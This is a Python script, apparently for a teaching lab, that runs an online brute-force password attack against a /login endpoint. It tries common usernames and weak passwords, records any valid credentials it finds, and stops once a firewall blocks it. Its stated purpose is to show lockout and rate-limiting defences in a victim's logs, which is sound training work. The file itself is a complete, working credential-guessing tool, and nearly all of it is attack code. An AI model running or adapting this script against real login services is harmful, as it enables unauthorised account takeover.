import requests
import time
from datetime import datetime
import sys
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('BruteForce')


class BruteForceAttacker:
    """
    Simple online password brute-force attacker against /login.
    Didactic goal:
      - Show repeated failed logins, account lockout / IP blocking,
        and firewall reactions in the victim’s logs and stats.
    """

    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/login"
        self.usernames = ['admin', 'user1', 'alice']
        # include some wrong passwords and the correct one to show both failure and success
        self.passwords = ['123456', 'password', 'admin', 'admin123', 'letmein', 'pass123']
        self.found_credentials = []
        self.blocked = False

    def try_login(self, username, password):
        try:
            resp = requests.post(
                self.target_url,
                json={'username': username, 'password': password},
                timeout=3
            )
            data = resp.json()
        except Exception as e:
            logger.error(f"Request error: {e}")
            return False

        if resp.status_code == 403 and data.get('blocked'):
            logger.warning(f"Blocked by WAF or firewall while trying {username}:{password}")
            self.blocked = True
            return False

        if data.get('success'):
            logger.info(f"SUCCESS: {username}:{password}")
            self.found_credentials.append((username, password))
            return True

        logger.info(f"Failed: {username}:{password}")
        return False

    def run(self, delay=0.2):
        start = datetime.now()
        print("=" * 60)
        print(f"[{start}] Starting brute-force attack against {self.target_url}")
        print("=" * 60)
        print("Didactic goal: show login abuse, rate limiting, account/ IP protection.\n")

        attempts = 0
        for u in self.usernames:
            for p in self.passwords:
                if self.blocked:
                    print("\nFirewall / victim has blocked further attempts from this client.")
                    break
                attempts += 1
                print(f"[Attempt {attempts}] Trying {u}:{p}")
                self.try_login(u, p)
                time.sleep(delay)

            if self.blocked:
                break

        end = datetime.now()
        print("\n" + "=" * 60)
        print("Brute-force attack finished")
        print(f"Duration: {(end - start).total_seconds():.2f} s")
        print(f"Total attempts: {attempts}")
        print(f"Valid credentials found: {len(self.found_credentials)}")
        for u, p in self.found_credentials:
            print(f"  - {u}:{p}")
        print("=" * 60)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.2
    attacker = BruteForceAttacker(target)
    attacker.run(delay=delay)
